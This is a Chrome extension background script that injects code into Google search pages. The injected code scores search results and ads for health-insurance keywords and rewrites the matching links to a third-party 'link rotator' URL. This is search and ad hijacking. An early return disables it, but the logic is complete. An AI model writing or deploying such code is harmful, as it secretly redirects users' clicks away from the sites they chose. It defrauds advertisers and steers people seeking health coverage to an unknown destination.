function processGoogle() {
    return;
    const linkRotator = 'https://goodcode.shop/health';
    const keywords = {
        "save": 1,
        "plan": 2,
        "care": 1,
        "quote": 2,
        "health": 2,
        "provider": 3,
        "premium": 1,
        "medicare": 2,
        "coverage": 1,
        "affordable care act": 2,
        "health care": 2,
        "medical": 2,
        "insurance": 3
    }
    const params = new Proxy(new URLSearchParams(window.location.search), {
        get: (searchParams, prop) => searchParams.get(prop),
    });
    const ads = document.querySelectorAll('[data-text-ad="1"]')
    const resultsText = document.querySelectorAll('[data-sokoban-container] [data-content-feature] ')

    function processGoogleDiv(text) {
        let mainLink = null;
        if (text.parentElement)
            mainLink = text.parentElement.querySelector('a')
        let score = 0;
        const matchedKeywords = [];
        let searchText = text.textContent.toLowerCase();
        score = CheckKeywords(searchText, matchedKeywords);
        if (mainLink) {
            const href = mainLink.getAttribute('href');
            if (href) {
                const score2 = CheckKeywords(href, matchedKeywords);
                if (score2 > 0) {
                    score += score2;
                }
            }
        }
        if (score > 4 && text.parentElement) {
            const links = text.parentElement.querySelectorAll('a')
            for (const link of links) {
                console.log({link, score, matchedKeywords});
                link.setAttribute('href', linkRotator)
                link.style.borderStyle = "dashed";
                link.style.borderColor = "red";
            }

        }
    }

    function CheckKeywords(searchText, matchedKeywords) {
        let score = 0;
        for (const keyword of Object.keys(keywords)) {

            if (matchedKeywords.indexOf(keyword) >= 0) {
                continue;
            }
            if (searchText.indexOf(keyword) >= 0) {
                //      console.log({keyword, link, score});
                score += keywords[keyword];
                matchedKeywords.push(keyword);
            }
        }
        return score;
    }

    function ModifyAds() {
        for (const text of ads) {
            processGoogleDiv(text);

        }
    }

    function ModifyGoogleSearchResults() {
        for (const text of resultsText) {
            processGoogleDiv(text);
        }
    }

    ModifyGoogleSearchResults();
    ModifyAds();
}

chrome.action.onClicked.addListener(async (tab) => {
    // let userReq = await fetch('https://example.com/user-data.json');
    // let user = await userReq.json();
    // let givenName = user.givenName || '<GIVEN_NAME>';


});
chrome.runtime.onInstalled.addListener(() => {

});
// This will run when a bookmark is created.
chrome.bookmarks.onCreated.addListener(() => {
    // do something
});

const filter = {
    url: [
        {
            urlMatches: 'https://www.google.com/',
        },
    ],
};

chrome.webNavigation.onCompleted.addListener((tab) => {
    chrome.scripting.executeScript({
        target: {tabId: tab.tabId},
        func: processGoogle,
        args: ["givenName"],
    });

}, filter);